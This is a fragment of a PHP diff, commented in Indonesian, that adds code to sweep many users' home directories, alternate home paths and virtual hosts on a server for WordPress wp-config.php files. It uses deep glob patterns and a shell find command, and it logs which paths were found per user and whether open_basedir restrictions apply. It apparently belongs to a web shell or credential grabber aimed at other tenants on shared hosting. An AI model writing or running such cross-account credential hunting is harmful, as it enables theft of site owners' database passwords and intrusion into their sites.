+        foreach ($detected_home_bases as $base) {
+            if (strpos($home_dir, $base) === 0) {
+                $current_base = $base;
+                break;
+            }
+        }
+        
+        if ($current_base) {
+            $username_from_path = basename($home_dir);
+            foreach ($detected_home_bases as $alt_base) {
+                if ($alt_base !== $current_base) {
+                    $alt_path = $alt_base . $username_from_path . '/';
+                    if (@is_dir($alt_path)) {
+                        $check_dirs[] = $alt_path;
+                    }
+                }
+            }
+        }
+        
+        // [PERBAIKAN] Tambahkan virtual host paths
+        foreach ($virtual_hosts as $vh_path) {
+            if (strpos($vh_path, $username) !== false && @is_dir($vh_path) && !in_array($vh_path, $check_dirs)) {
+                $check_dirs[] = rtrim($vh_path, '/') . '/';
+            }
+        }
+        
+        $user_debug['dirs_checked'] = count($check_dirs);
+        
+        $user_found_paths = [];
+        foreach ($check_dirs as $check_dir) {
+            foreach ($quick_paths as $quick_path) {
+                if ((microtime(true) - $user_start) > $max_time_per_user) break;
+                
+                if (strpos($quick_path, '*') !== false) {
+                    $pattern = rtrim($check_dir, '/') . '/' . ltrim($quick_path, '/');
+                    $user_debug['glob_patterns_tried']++;
+                    $found_files = @glob($pattern);
+                    if ($found_files && is_array($found_files)) {
+                        foreach ($found_files as $found_file) {
+                            $user_debug['paths_checked']++;
+                            if (@file_exists($found_file) && @is_file($found_file)) {
+                                $is_duplicate = false;
+                                foreach ($results['wp_configs_found'] as $existing) {
+                                    if ($existing['path'] === $found_file) {
+                                        $is_duplicate = true;
+                                        break;
+                                    }
+                                }
+                                if (!$is_duplicate) {
+                                    $results['wp_configs_found'][] = [
+                                        'user' => $username,
+                                        'home' => $check_dir,
+                                        'path' => $found_file
+                                    ];
+                                    $user_debug['found_count']++;
+                                }
+                            }
+                        }
+                    }
+                    continue;
+                }
+                
+                $full_path = rtrim($check_dir, '/') . '/' . ltrim($quick_path, '/');
+                $user_debug['paths_checked']++;
+                
+                if (@file_exists($full_path) && @is_file($full_path)) {
+                    $path_key = $username . '|' . $full_path;
+                    if (!isset($user_found_paths[$path_key])) {
+                        $user_found_paths[$path_key] = true;
+                        
+                        $is_duplicate = false;
+                        foreach ($results['wp_configs_found'] as $existing) {
+                            if ($existing['path'] === $full_path) {
+                                $is_duplicate = true;
+                                break;
+                            }
+                        }
+                        
+                        if (!$is_duplicate) {
+                            $results['wp_configs_found'][] = [
+                                'user' => $username,
+                                'home' => $check_dir,
+                                'path' => $full_path
+                            ];
+                            $user_debug['found_count']++;
+                        }
+                    }
+                }
+            }
+            
+            // [PERBAIKAN] Depth scanning dengan glob patterns yang lebih dalam
+            if ((microtime(true) - $user_start) < $max_time_per_user) {
+                $deep_glob_patterns = [
+                    $check_dir . '*/wp-config.php',
+                    $check_dir . '*/*/wp-config.php',
+                    $check_dir . '*/*/*/wp-config.php',
+                    $check_dir . '*/*/*/*/wp-config.php',
+                    $check_dir . '*/*/*/*/*/wp-config.php',
+                    $check_dir . 'public_html/*/wp-config.php',
+                    $check_dir . 'public_html/*/*/wp-config.php',
+                    $check_dir . 'public_html/*/*/*/wp-config.php',
+                    $check_dir . 'www/*/wp-config.php',
+                    $check_dir . 'www/*/*/wp-config.php',
+                    $check_dir . 'html/*/wp-config.php',
+                    $check_dir . 'domains/*/wp-config.php',
+                    $check_dir . 'domains/*/*/wp-config.php',
+                    $check_dir . 'domains/*/*/*/wp-config.php',
+                    $check_dir . 'domains/*/public_html/wp-config.php',
+                    $check_dir . 'domains/*/public_html/*/wp-config.php',
+                    $check_dir . 'domains/*/public_html/*/*/wp-config.php',
+                    $check_dir . 'domains/*/www/wp-config.php',
+                    $check_dir . 'subdomains/*/wp-config.php',
+                    $check_dir . 'subdomains/*/public_html/wp-config.php'
+                ];
+                
+                foreach ($deep_glob_patterns as $pattern) {
+                    if ((microtime(true) - $user_start) > $max_time_per_user) break;
+                    $user_debug['glob_patterns_tried']++;
+                    $found_files = @glob($pattern);
+                    if ($found_files && is_array($found_files)) {
+                        foreach ($found_files as $found_file) {
+                            if (@file_exists($found_file) && @is_file($found_file)) {
+                                $is_duplicate = false;
+                                foreach ($results['wp_configs_found'] as $existing) {
+                                    if ($existing['path'] === $found_file) {
+                                        $is_duplicate = true;
+                                        break;
+                                    }
+                                }
+                                if (!$is_duplicate) {
+                                    $results['wp_configs_found'][] = [
+                                        'user' => $username,
+                                        'home' => $check_dir,
+                                        'path' => $found_file
+                                    ];
+                                    $user_debug['found_count']++;
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        
+        // [PERBAIKAN] Fallback find command untuk scanning lebih dalam
+        if ((microtime(true) - $user_start) < $max_time_per_user && $use_find_command) {
+            foreach ($check_dirs as $check_dir) {
+                $find_command = "find " . escapeshellarg($check_dir) . " -maxdepth 10 -type f -name 'wp-config.php' 2>/dev/null | head -30";
+                $output = [];
+                $return_var = 0;
+                @exec($find_command, $output, $return_var);
+                
+                if (!empty($output)) {
+                    foreach ($output as $found_file) {
+                        $found_file = trim($found_file);
+                        if (empty($found_file)) continue;
+                        
+                        if (@file_exists($found_file)) {
+                            $is_duplicate = false;
+                            foreach ($results['wp_configs_found'] as $existing) {
+                                if ($existing['path'] === $found_file) {
+                                    $is_duplicate = true;
+                                    break;
+                                }
+                            }
+                            if (!$is_duplicate) {
+                                $results['wp_configs_found'][] = [
+                                    'user' => $username,
+                                    'home' => $check_dir,
+                                    'path' => $found_file
+                                ];
+                                $user_debug['found_count']++;
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        
+        if ((microtime(true) - $user_start) > $max_time_per_user) {
+            $results['skipped_users'][] = $username;
+            $user_debug['timeout'] = true;
+            writeLog("User $username timeout after $max_time_per_user seconds");
+        }
+        
+        if ($user_debug['found_count'] > 0 || $results['scanned_users'] <= 50) {
+            $user_debug['time_taken'] = round(microtime(true) - $user_start, 3);
+            $results['user_debug'][] = $user_debug;
+        }
+        
+        if ((microtime(true) - $start_time) > 270) {
+            writeLog("Global timeout reached after 270 seconds");
+            break;
+        }
+    }
+    
+    $open_basedir_info = frida_check_openbasedir();
+    $results['debug_info'] = [
+        'total_time' => round(microtime(true) - $start_time, 2),
+        'avg_time_per_user' => $results['scanned_users'] > 0 ? round((microtime(true) - $start_time) / $results['scanned_users'], 3) : 0,
+        'skipped_count' => count($results['skipped_users']),
+        'open_basedir' => $open_basedir_info['open_basedir'] ?? null,
+        'open_basedir_restricted' => !empty($open_basedir_info['open_basedir']),
+        'virtual_hosts_count' => count($virtual_hosts)
+    ];
+    
+    writeLog("Scan completed in " . $results['debug_info']['total_time'] . " seconds");
+    writeLog("Total users scanned: " . $results['scanned_users']);
+    writeLog("Total wp-config found: " . count($results['wp_configs_found']));
+    
+    return $results;
+}
+?>
